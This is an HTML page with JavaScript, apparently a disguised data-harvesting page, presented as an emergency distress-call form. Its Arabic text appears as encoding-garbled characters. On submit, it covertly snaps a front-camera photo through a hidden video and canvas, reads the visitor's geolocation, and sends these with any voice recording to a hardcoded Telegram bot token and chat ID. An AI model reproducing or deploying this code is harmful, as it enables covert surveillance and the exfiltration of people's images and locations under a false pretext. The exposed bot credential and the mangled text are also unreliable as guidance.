<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù†Ø¸Ø§Ù… Ø§Ù„Ø·ÙˆØ§Ø±Ø¦ Ø§Ù„Ù…ØªÙƒØ§Ù…Ù„ (ØµÙˆØª ÙˆØµÙˆØ±Ø©)</title>
    <style>
        body { font-family: sans-serif; background-color: #1a1a1a; color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .container { background-color: #2d2d2d; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; border: 2px solid #ff4d4d; box-shadow: 0 0 20px rgba(255, 77, 77, 0.3); }
        h1 { color: #ff4d4d; margin-bottom: 5px; }
        p { font-size: 14px; color: #ccc; margin-bottom: 20px; }
        textarea { width: 100%; height: 80px; padding: 10px; border-radius: 8px; background: #3d3d3d; color: white; border: 1px solid #444; box-sizing: border-box; font-size: 16px; margin-bottom: 10px; }
        .audio-controls { display: flex; gap: 10px; margin-bottom: 15px; }
        .btn-audio { flex: 1; padding: 12px; border-radius: 8px; border: none; cursor: pointer; font-weight: bold; background-color: #444; color: white; }
        .recording { background-color: #ff4d4d !important; animation: pulse 1s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        .btn-send { width: 100%; padding: 18px; border: none; border-radius: 8px; background-color: #4CAF50; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
        #status { margin-top: 15px; font-size: 13px; color: #ffeb3b; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <h1>ğŸš¨ Ù†Ø¯Ø§Ø¡ Ø§Ø³ØªØºØ§Ø«Ø©</h1>
    <p>Ø³Ø¬Ù„ ØµÙˆØªÙƒ Ø£Ùˆ Ø§ÙƒØªØ¨ Ø±Ø³Ø§Ù„Ø© Ù„Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙˆØ±ÙŠ</p>
    
    <textarea id="msgInput" placeholder="Ø§ÙƒØªØ¨ ØªÙØ§ØµÙŠÙ„ Ø¥Ø¶Ø§ÙÙŠØ© Ù‡Ù†Ø§..."></textarea>
    
    <div class="audio-controls">
        <button id="recordBtn" class="btn-audio" onclick="toggleRecording()">ğŸ¤ ØªØ³Ø¬ÙŠÙ„ ØµÙˆØª</button>
        <button id="stopBtn" class="btn-audio" onclick="stopRecording()" disabled>â¹ï¸ Ø¥ÙŠÙ‚Ø§Ù</button>
    </div>
    
    <button id="sendBtn" class="btn-send" onclick="startEmergencyProcess()">Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨Ù„Ø§Øº Ø§Ù„Ø¢Ù†</button>
    
    <div id="status"></div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
</div>

<script>
const TOKEN = "8579983010:AAFKblFfzbNYk0bXOY6afuSZg3cIu35nobI";
const CHAT_ID = "6837507867";

let mediaRecorder;
let audioChunks = [];
let audioBlob = null;

// ÙˆØ¸Ø§Ø¦Ù ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØª
async function toggleRecording() {
    audioChunks = [];
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    mediaRecorder = new MediaRecorder(stream);
    
    mediaRecorder.ondataavailable = (event) => audioChunks.push(event.data);
    mediaRecorder.onstop = () => {
        audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
        document.getElementById('status').innerText = "âœ… ØªÙ… ØªØ¬Ù‡ÙŠØ² Ø§Ù„Ù…Ù‚Ø·Ø¹ Ø§Ù„ØµÙˆØªÙŠ";
    };

    mediaRecorder.start();
    document.getElementById('recordBtn').classList.add('recording');
    document.getElementById('recordBtn').disabled = true;
    document.getElementById('stopBtn').disabled = false;
    document.getElementById('status').innerText = "ğŸ™ï¸ Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¢Ù†...";
}

function stopRecording() {
    mediaRecorder.stop();
    document.getElementById('recordBtn').classList.remove('recording');
    document.getElementById('recordBtn').disabled = false;
    document.getElementById('stopBtn').disabled = true;
}

// Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨Ù„Ø§Øº Ø§Ù„ÙƒØ§Ù…Ù„
async function startEmergencyProcess() {
    const status = document.getElementById('status');
    const btn = document.getElementById('sendBtn');
    btn.disabled = true;
    status.innerText = "Ø¬Ø§Ø±ÙŠ Ø¬Ù…Ø¹ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆØ§Ù„ØµÙˆØ±Ø© ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...";

    let photoBlob = null;
    let locationStr = "Ø§Ù„Ù…ÙˆÙ‚Ø¹ ØºÙŠØ± Ù…ØªØ§Ø­";

    // 1. Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ØªÙ„Ù‚Ø§Ø¦ÙŠØ©
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.getElementById('video');
        video.srcObject = stream;
        await new Promise(res => setTimeout(res, 1000));
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
        stream.getTracks().forEach(t => t.stop());
    } catch (e) { console.log("Camera error"); }

    // 2. Ø¬Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹
    if (navigator.geolocation) {
        try {
            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
            locationStr = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        } catch (e) { locationStr = "Ø§Ù„Ù…ÙˆÙ‚Ø¹ (Ù…Ø±ÙÙˆØ¶)"; }
    }

    const time = new Date().toLocaleString('ar-YE');
    const userNote = document.getElementById('msgInput').value || "Ø¨Ø¯ÙˆÙ† Ù†Øµ";
    const caption = `ğŸš¨ Ø¨Ù„Ø§Øº Ø·ÙˆØ§Ø±Ø¦ Ø¬Ø¯ÙŠØ¯\nğŸ“: ${userNote}\nğŸ“: ${locationStr}\nâ°: ${time}`;

    try {
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø£ÙˆÙ„Ø§Ù‹ Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        if (photoBlob) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', photoBlob, 'img.jpg');
            fd.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØªÙŠ Ø¥Ø°Ø§ ÙˆØ¬Ø¯
        if (audioBlob) {
            const fdAudio = new FormData();
            fdAudio.append('chat_id', CHAT_ID);
            fdAudio.append('voice', audioBlob, 'voice.ogg');
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fdAudio });
        }

        status.innerHTML = "âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ ÙƒÙ„ Ø´ÙŠØ¡ Ø¨Ù†Ø¬Ø§Ø­!";
        status.style.color = "#4CAF50";
        audioBlob = null; // ØªØµÙÙŠØ± Ø§Ù„ØµÙˆØª Ø¨Ø¹Ø¯ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
    } catch (err) {
        status.innerText = "âŒ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„";
    }
    btn.disabled = false;
}
</script>

</body>
</html>
